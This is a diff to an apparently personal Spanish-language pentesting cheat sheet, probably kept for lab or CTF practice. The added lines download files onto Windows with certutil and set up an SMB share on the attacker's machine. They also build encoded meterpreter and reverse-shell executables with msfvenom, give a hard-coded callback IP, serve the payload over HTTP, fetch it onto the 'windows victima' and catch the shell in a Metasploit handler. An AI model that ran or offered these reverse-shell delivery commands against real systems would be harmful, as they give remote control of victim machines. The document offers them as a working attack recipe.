@@ -57,8 +57,8 @@ otorgar permisos icacls "ruta\al\archivo" /grant NombreDeUsuario:F
 
 ######## transferir archivos de linux a windows ###########
 //en linux abrir un servidor
-certutil.exe -f -urlcache -split http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
-2
+en windows: certutil -urlcache -f http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
+OR
 Linux: impacket-smbserver recurso $(pwd) -smb2support
 windows: copy \\<ip atacante>\recurso\archivo.extension archivo.extension
 
@@ -132,3 +132,27 @@ ip
 
 ########## exploit magento ############
 froghopper attack
+
+
+############ shell meterpreter con msfvenom y metasploit ##############
+consola: msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.87.166 LPORT=1234 -f exe -o shell.exe
+or
+consola: msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.87.166 LPORT=1234 -f exe -o shell.exe
+
+consola abre servidor: python3 -m http.server 8000
+en el windows victima: certutil -urlcache -f http://ip_servidor:puerto_servidor/archivo archivo
+
+msfconsole: use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+options
+exploit
+
+maquina victima: shell.exe
+
+
+
+
+########  windows informacion de servicios que estan corriendo ###########
+sc queryex | find /i "SERVICE_NAME:"
+binarios corriendo
+ps
